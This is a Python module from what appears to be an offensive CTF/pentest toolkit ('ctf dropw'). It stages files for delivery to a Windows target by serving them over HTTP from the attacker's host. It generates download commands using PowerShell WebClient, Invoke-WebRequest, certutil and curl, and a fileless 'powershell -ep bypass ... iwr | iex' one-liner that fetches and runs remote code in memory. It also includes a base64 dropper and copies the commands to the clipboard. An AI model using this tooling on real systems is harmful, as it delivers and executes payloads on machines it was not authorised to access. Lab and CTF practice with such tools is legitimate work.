import base64
import http.server
import os
import socket
import socketserver
import threading
from pathlib import Path
from core.attacker import resolve_lhost

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
M = '\033[35m'
W_BOLD = '\033[1m'

# =========================================================
# HELPERS
# =========================================================



def copy_clipboard(text):

    try:

        import pyperclip

        pyperclip.copy(text)

        return True

    except Exception:

        return False


# =========================================================
# COMMAND BUILDERS
# =========================================================

def build_http_commands(
    ip,
    port,
    filename,
    remote_dir=None,
):

    if remote_dir:

        remote_path = (
            f"{remote_dir}\\{filename}"
        )

    else:

        remote_path = (
            f".\\\\{filename}"
        )

    ps1 = (
        f"(New-Object Net.WebClient).DownloadFile("
        f"'http://{ip}:{port}/{filename}',"
        f"'{remote_path}')"
    )

    iwr = (
        f"Invoke-WebRequest "
        f"http://{ip}:{port}/{filename} "
        f"-OutFile \"{remote_path}\""
    )

    certutil = (
        f"certutil -urlcache -f "
        f"http://{ip}:{port}/{filename} "
        f"\"{remote_path}\""
    )

    curl = (
        f"curl http://{ip}:{port}/{filename} "
        f"-o \"{remote_path}\""
    )

    return {
        "powershell": ps1,
        "iwr": iwr,
        "certutil": certutil,
        "curl": curl,
    }


def build_fileless_command(ip, port, filename):

    return (
        f"powershell -ep bypass -nop -c "
        f"\"iwr http://{ip}:{port}/{filename} | iex\""
    )


def build_offline_command(filepath):

    data = Path(filepath).read_bytes()

    encoded = base64.b64encode(data).decode()

    filename = Path(filepath).name

    return (
        f"$b64='{encoded}'; "
        f"[IO.File]::WriteAllBytes("
        f"(Join-Path (Get-Location).Path '{filename}'), "
        f"[Convert]::FromBase64String($b64)"
        f")"
    )


# =========================================================
# HTTP SERVER
# =========================================================

def serve_http(directory, port=8080):

    directory = Path(directory).resolve()

    os.chdir(directory)

    handler = http.server.SimpleHTTPRequestHandler

    class ReusableTCPServer(socketserver.TCPServer):
        allow_reuse_address = True

    httpd = ReusableTCPServer(
        ("0.0.0.0", port),
        handler
    )

    thread = threading.Thread(
        target=httpd.serve_forever,
        daemon=True
    )

    thread.start()

    return httpd


# =========================================================
# MODES
# =========================================================

def mode_http(
    files,
    ip,
    port,
    remote_dir=None,
):
    print(f"\n{M}=== HTTP ==={W}\n")

    clipboard = []

    for filepath in files:

        filename = Path(filepath).name

        cmds = build_http_commands(
            ip,
            port,
            filename,
            remote_dir,
        )

        print(f"{C}{filename}{W}\n")

        for name, cmd in cmds.items():

            print(f"{B}[{name}]{W}")
            print(cmd)
            print()

        clipboard.append(cmds["iwr"])

    copy_clipboard(
        "\n".join(clipboard)
    )

    print(f"{G}→ helpers copied to clipboard{W}")

    directory = Path(files[0]).parent

    print(
        f"\n{Y}[*] Serving "
        f"{len(files)} file(s) "
        f"at http://{ip}:{port}/{W}"
    )

    return serve_http(directory, port)


def mode_fileless(filepath, ip, port):

    filename = Path(filepath).name

    cmd = build_fileless_command(
        ip,
        port,
        filename
    )

    print(f"\n{M}=== FILELESS ==={W}\n")

    print(cmd)

    copy_clipboard(cmd)

    print(f"\n{G}→ helper copied to clipboard{W}")

    print(
        f"\n{Y}[*] Serving {filename} "
        f"at http://{ip}:{port}/{W}"
    )

    return serve_http(
        Path(filepath).parent,
        port,
    )


def mode_offline(files):

    print(f"\n{M}=== OFFLINE ==={W}\n")

    clipboard = []

    for filepath in files:

        cmd = build_offline_command(filepath)

        print(f"{C}{Path(filepath).name}{W}\n")

        print(cmd)
        print()

        clipboard.append(cmd)

    copy_clipboard(
        "\n\n".join(clipboard)
    )

    print(f"{G}→ helpers copied to clipboard{W}")


# =========================================================
# MENU
# =========================================================

def choose_mode():

    print(f"\n{W_BOLD}[*] WINDOWS FILE DELIVERY{W}")

    print(f"\n  {B}[1]{W} HTTP")
    print(f"  {B}[2]{W} Fileless")
    print(f"  {B}[3]{W} Offline Base64")

    print()

    choice = input(f"{B}select{W}> ").strip()

    mapping = {
        "1": "http",
        "2": "fileless",
        "3": "offline",
    }

    return mapping.get(choice)


# =========================================================
# PUBLIC API
# =========================================================

def stage_windows_files(
    files,
    data=None,
    method=None,
    ip=None,
    port=8080,
    remote_dir=None,
):

    files = [
        Path(f).resolve()
        for f in files
    ]

    for filepath in files:

        if not filepath.exists():

            print(
                f"\n{R}[!] File not found:{W}"
            )

            print(f"  {filepath}")

            return

    if not ip:
        ip = resolve_lhost(args=None, data=data)

    if not method:
        method = choose_mode()

    if not method:
        return

    # =====================================================
    # HTTP
    # =====================================================

    if method == "http":

        server = mode_http(
            files,
            ip,
            port,
            remote_dir,
        )

        try:
            input("\nPress ENTER to stop server...\n")
        finally:
            server.shutdown()

    # =====================================================
    # FILELESS
    # =====================================================

    elif method == "fileless":

        if len(files) > 1:

            print(
                f"\n{R}[!] "
                f"Fileless mode only supports one file.{W}"
            )

            return

        server = mode_fileless(
            files[0],
            ip,
            port,
        )

        try:
            input("\nPress ENTER to stop server...\n")
        finally:
            server.shutdown()

    # =====================================================
    # OFFLINE
    # =====================================================

    elif method == "offline":

        mode_offline(files)


# =========================================================
# BACKWARD COMPAT
# =========================================================

def stage_windows_file(
    filepath,
    data=None,
    method=None,
    ip=None,
    port=8080,
    remote_dir=None,
):

    return stage_windows_files(
    [filepath],
    data=data,
    method=method,
    ip=ip,
    port=port,
    remote_dir=remote_dir,
)


# =========================================================
# CLI
# =========================================================

def run(data=None, cred=None, args=None):

    files = []

    # =====================================================
    # MULTI FILE
    # =====================================================

    arg_files = getattr(args, "files", None)

    if arg_files:

        if isinstance(arg_files, str):

            files.append(arg_files)

        else:

            files.extend(arg_files)

    # =====================================================
    # SINGLE FILE
    # =====================================================

    arg_file = getattr(args, "file", None)

    if arg_file:

        files.append(arg_file)

    # =====================================================
    # FAIL
    # =====================================================

    if not files:

        print(
            f"\n{R}[!] Usage:{W} "
            f"ctf dropw <file1> [file2] [file3]"
        )

        return data

    # =====================================================
    # DEDUP
    # =====================================================

    files = list(dict.fromkeys(files))

    # =====================================================
    # STAGE
    # =====================================================

    stage_windows_files(
        files,
        data=data,
    )

    return data